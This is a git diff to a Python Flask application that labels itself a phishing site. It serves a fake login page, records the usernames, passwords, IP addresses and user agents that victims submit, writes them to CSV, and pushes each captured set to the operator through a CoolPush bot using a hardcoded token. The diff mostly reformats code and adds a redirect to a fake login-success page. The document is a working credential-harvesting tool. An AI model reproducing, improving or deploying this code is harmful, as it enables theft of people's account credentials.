@@ -1,7 +1,7 @@
 '''
 Author: whalefall
 Date: 2021-04-04 01:56:10
-LastEditTime: 2021-04-04 14:55:19
+LastEditTime: 2021-04-04 15:23:02
 Description: Flask框架钓鱼网站
 '''
 from flask import *
@@ -52,37 +52,40 @@ def writeCSV(**keyword):
 
         # 上钩推送酷退
         bot.pushSend("[%s]UserID:%s pwd:%s ua:%s ip:%s 已上勾勾" %
-              (_time, userid, pwd, ua, ip))
+                     (_time, userid, pwd, ua, ip))
 
         return True
     except:
         return False
+
 
 class Logging(object):
 
     def __init__(self):
         pass
 
-    def debug(self,msg):
+    def debug(self, msg):
         print(Fore.BLACK+Back.WHITE+"[DEBUG]"+msg)
 
-    def info(self,msg):
+    def info(self, msg):
         print(Fore.BLACK+Back.BLUE+"[INFO]"+msg)
 
-    def warning(self,msg):
+    def warning(self, msg):
         print(Fore.YELLOW+Back.BLACK+"[WARNING]"+msg)
 
-    def error(self,msg):
+    def error(self, msg):
         print(Fore.RED+Back.BLACK+"[ERROR]"+msg)
-    
-    def critical(self,msg):
+
+    def critical(self, msg):
         print(Fore.BLACK+Back.RED+"[CRITICAL]"+msg)
 
 # 酷q推送
+
+
 class CoolPush():
-    
+
     def __init__(self, token):
-        
+
         self.token = token
 
         self.headers = {
@@ -123,7 +126,7 @@ class CoolPush():
 @app.route('/', methods=["GET", "POST"])
 def index():
     # 防止浏览器缓存
-    return render_template('index.html',rand=int(time.time()))
+    return render_template('index.html', rand=int(time.time()))
 
 
 @app.route('/KsLoginAction/', methods=["GET", "POST"])
@@ -158,8 +161,13 @@ def loginAPI():
     if userid == "" or userid == None or pwd == "" or pwd == None:
         return render_template("KsLoginAction.html", status="empty")
 
-    return render_template("KsLoginSuccessAction.html", userid=userid, ip=ip, ua=ua)
+    # return render_template("KsLoginSuccessAction.html", userid=userid, ip=ip, ua=ua)
+    return redirect("/LoginSuccessAction/%s/%s/%s" % (userid, ip, ua.replace("/","-")))
 
+
+@app.route('/LoginSuccessAction/<userid>/<ip>/<ua>', methods=["GET", "POST"])
+def suc_index(userid,ip,ua):
+    return render_template("KsLoginSuccessAction.html", userid=userid, ip=ip, ua=ua)
 
 @app.errorhandler(404)
 def page_not_found(e):
@@ -167,6 +175,6 @@ def page_not_found(e):
 
 
 if __name__ == "__main__":
-    bot=CoolPush("92f83d0596c7b553ea1df9f242e4fc46")
-    log=Logging()
+    bot = CoolPush("92f83d0596c7b553ea1df9f242e4fc46")
+    log = Logging()
     app.run(host="0.0.0.0", port=5000, threaded=True)
